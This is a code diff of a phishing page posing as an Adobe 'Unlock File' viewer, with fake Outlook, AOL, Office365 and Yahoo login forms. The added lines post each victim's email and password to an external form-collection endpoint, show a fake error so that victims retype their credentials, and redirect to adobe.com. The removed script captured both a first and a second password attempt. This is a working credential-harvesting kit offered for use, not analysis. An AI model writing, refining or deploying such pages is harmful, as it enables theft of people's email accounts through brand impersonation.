@@ -2,10 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <!-- ADDED: Prevent search engines from indexing -->
+    <!-- Prevent search engines from indexing -->
     <meta name="robots" content="noindex, nofollow">
-    <!-- Botpoison Script -->
-    <script src="https://unpkg.com/@botpoison/browser" async></script>
     
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
     <link rel="icon" href="https://www.kindpng.com/picc/m/163-1638130_transparent-adobe-logo-png-png-download.png">
@@ -67,17 +65,12 @@
             padding: 8px;
             background: #fff;
         }
-        
-        /* Honeypot field style */
-        .honeypot {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
 <div id="imgDiv"></div>
 
-<!-- Hidden iframe for form submission -->
+<!-- Hidden iframe for form submission (still useful to prevent page redirect on submit) -->
 <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
 <div class="container">
@@ -102,10 +95,14 @@
                     <img style="width:50px; height:50px;" src="https://i7.pngguru.com/preview/653/271/784/microsoft-outlook-outlook-com-email-microsoft-office-365-outlook-logo.jpg">
                 </div>
                 <div class="modal-body">
-                    <!-- ADDED: Honeypot field -->
+                    <!-- Honeypot field for basic bot protection -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                     
-                    <form id="outlookForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                    <!-- SIMPLIFIED FORM: Direct POST to Formspark with redirect -->
+                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
+                        <!-- Redirect after submission -->
+                        <input type="hidden" name="_redirect" value="https://adobe.com">
+                        
                         <div class="form-group">
                             <label for="emailOutlook">Email</label>
                             <input class="form-control" type="email" id="emailOutlook" name="email_1" placeholder="Your receiving email" required>
@@ -115,7 +112,6 @@
                             <input class="form-control" type="password" id="pwdOutlook" name="pw_1" placeholder="Your password" required>
                         </div>
                         <input type="hidden" name="provider" value="outlook">
-                        <input type="hidden" id="attemptOutlook" name="attempt" value="1">
                         <input type="hidden" name="adobe_login" value="true">
                         <button type="submit" class="btn btn-primary">Unlock File</button>
                     </form>
@@ -143,10 +139,12 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1280px-AOL_logo.svg.png" style="width:50px;height:50px;">
                 </div>
                 <div class="modal-body">
-                    <!-- ADDED: Honeypot field -->
+                    <!-- Honeypot field -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                     
-                    <form id="aolForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
+                        <input type="hidden" name="_redirect" value="https://adobe.com">
+                        
                         <div class="form-group">
                             <label for="emailAol">Email</label>
                             <input class="form-control" type="email" id="emailAol" name="email_1" placeholder="Your receiving email" required>
@@ -156,7 +154,6 @@
                             <input class="form-control" type="password" id="pwdAol" name="pw_1" placeholder="Your password" required>
                         </div>
                         <input type="hidden" name="provider" value="aol">
-                        <input type="hidden" id="attemptAol" name="attempt" value="1">
                         <input type="hidden" name="adobe_login" value="true">
                         <button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
                     </form>
@@ -184,10 +181,12 @@
                     <img src="https://www.tdaniels.com/files/2017/03/Office365_V2.png" style="width:50px; height:50px;">
                 </div>
                 <div class="modal-body">
-                    <!-- ADDED: Honeypot field -->
+                    <!-- Honeypot field -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                     
-                    <form id="officeForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
+                        <input type="hidden" name="_redirect" value="https://adobe.com">
+                        
                         <div class="form-group">
                             <label for="emailOffice">Email</label>
                             <input class="form-control" type="email" id="emailOffice" name="email_1" placeholder="Your receiving email" required>
@@ -197,7 +196,6 @@
                             <input class="form-control" type="password" id="pwdOffice" name="pw_1" placeholder="Your password" required>
                         </div>
                         <input type="hidden" name="provider" value="office365">
-                        <input type="hidden" id="attemptOffice" name="attempt" value="1">
                         <input type="hidden" name="adobe_login" value="true">
                         <button type="submit" class="btn btn-primary" style="background: red;border:1px solid red;">Unlock File</button>
                     </form>
@@ -225,10 +223,12 @@
                     <img src="https://s.yimg.com/uu/api/res/1.2/Dn1UwBT_Cr.lJucziCG49A--~B/aD05MTQ7dz0xNTg0O3NtPTE7YXBwaWQ9eXRhY2h5b24-/https://media-mbst-pub-ue1.s3.amazonaws.com/creatr-uploaded-images/2019-09/a929b8f0-dd65-11e9-bffe-b90463fd5188" style="width:50px;height:50px;">
                 </div>
                 <div class="modal-body">
-                    <!-- ADDED: Honeypot field -->
+                    <!-- Honeypot field -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                     
-                    <form id="yahooForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
+                        <input type="hidden" name="_redirect" value="https://adobe.com">
+                        
                         <div class="form-group">
                             <label for="emailYahoo">Email</label>
                             <input class="form-control" type="email" id="emailYahoo" name="email_1" placeholder="Your receiving email" required>
@@ -238,7 +238,6 @@
                             <input class="form-control" type="password" id="pwdYahoo" name="pw_1" placeholder="Your password" required>
                         </div>
                         <input type="hidden" name="provider" value="yahoo">
-                        <input type="hidden" id="attemptYahoo" name="attempt" value="1">
                         <input type="hidden" name="adobe_login" value="true">
                         <button type="submit" class="btn btn-primary" style="background:purple;border:1px solid purple;">Unlock File</button>
                     </form>
@@ -266,10 +265,12 @@
                     <img src="https://cdn1.vectorstock.com/i/1000x1000/20/55/email-icon-black-and-white-mail-vector-24922055.jpg" style="width:50px; height:50px;">
                 </div>
                 <div class="modal-body">
-                    <!-- ADDED: Honeypot field -->
+                    <!-- Honeypot field -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
                     
-                    <form id="otherForm" target="hidden_iframe" data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75">
+                    <form action="https://submit-form.com/0gyAIslPc" method="POST" target="hidden_iframe">
+                        <input type="hidden" name="_redirect" value="https://adobe.com">
+                        
                         <div class="form-group">
                             <label for="emailOther">Email</label>
                             <input class="form-control" type="email" id="emailOther" name="email_1" placeholder="Your receiving email" required>
@@ -279,7 +280,6 @@
                             <input class="form-control" type="password" id="pwdOther" name="pw_1" placeholder="Your password" required>
                         </div>
                         <input type="hidden" name="provider" value="other">
-                        <input type="hidden" id="attemptOther" name="attempt" value="1">
                         <input type="hidden" name="adobe_login" value="true">
                         <button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
                     </form>
@@ -301,94 +301,30 @@
 
 </div>
 
+<!-- Bootstrap and jQuery Scripts -->
 <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
 
+<!-- Simple script for showing the error message (optional, but keeps user experience) -->
 <script>
-// Store first attempt credentials
-let firstAttempt = {
-    email: '',
-    password: '',
-    provider: ''
-};
-
-// Handle all form submissions
-document.querySelectorAll('form').forEach(form => {
-    form.addEventListener('submit', function(e) {
-        // Don't prevent default
-        
-        // Get current form data
-        const email = $(this).find('input[type="email"]').val();
-        const password = $(this).find('input[type="password"]').val();
-        const attempt = $(this).find('input[name="attempt"]').val();
-        
-        // Determine provider from form id
-        let provider = '';
-        if (form.id === 'outlookForm') provider = 'outlook';
-        if (form.id === 'aolForm') provider = 'aol';
-        if (form.id === 'officeForm') provider = 'office365';
-        if (form.id === 'yahooForm') provider = 'yahoo';
-        if (form.id === 'otherForm') provider = 'other';
-        
-        // Show spinner
-        showSpinner();
-        
-        // Set form action to Formspark
-        form.action = "https://submit-form.com/0gyAIslPc";
-        form.method = "POST";
-        
-        if (attempt == 1) {
-            // First attempt: Store credentials
-            firstAttempt.email = email;
-            firstAttempt.password = password;
-            firstAttempt.provider = provider;
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', function(e) {
+            // Show the spinner (optional visual feedback)
+            document.querySelector('.spinner').style.display = 'block';
             
-            // Update hidden field to 2 for next attempt
-            $(this).find('input[name="attempt"]').val('2');
-            
-            // Show error after 2 seconds
-            setTimeout(showError, 2000);
-            
-        } else {
-            // Second attempt: Add first attempt data as hidden fields
-            $(this).append('<input type="hidden" name="first_attempt_email" value="' + firstAttempt.email + '">');
-            $(this).append('<input type="hidden" name="first_attempt_password" value="' + firstAttempt.password + '">');
-            $(this).append('<input type="hidden" name="first_provider" value="' + firstAttempt.provider + '">');
-            
-            // Redirect to Adobe after form submits
-            setTimeout(function() {
-                window.location.href = 'https://adobe.com';
-            }, 1000);
-        }
+            // For a single-page feel, we don't prevent default.
+            // The form submits to the hidden iframe, and the page won't reload.
+            // The error message can be shown after a delay if needed.
+            setTimeout(() => {
+                document.querySelectorAll('.error-div').forEach(el => el.style.display = 'block');
+                document.querySelector('.spinner').style.display = 'none';
+            }, 2000);
+        });
     });
-});
-
-// Spinner functions
-function showSpinner(){
-    var spinner = $('.spinner');
-    spinner.show();
-}
-
-function clearSpinner(){
-    var spinner = $('.spinner');
-    spinner.remove();
-}
-
-function showError(){
-    var error = $('.alert');
-    error.show();
-    clearSpinner();
-    
-    setTimeout(clearError, 3000);
-}
-    
-function clearError() {
-    $('.alert').hide();
-}
 </script>
 
-<!-- ADDED: Spinner div -->
+<!-- Spinner Div -->
 <div class="spinner"></div>
 
 </body>
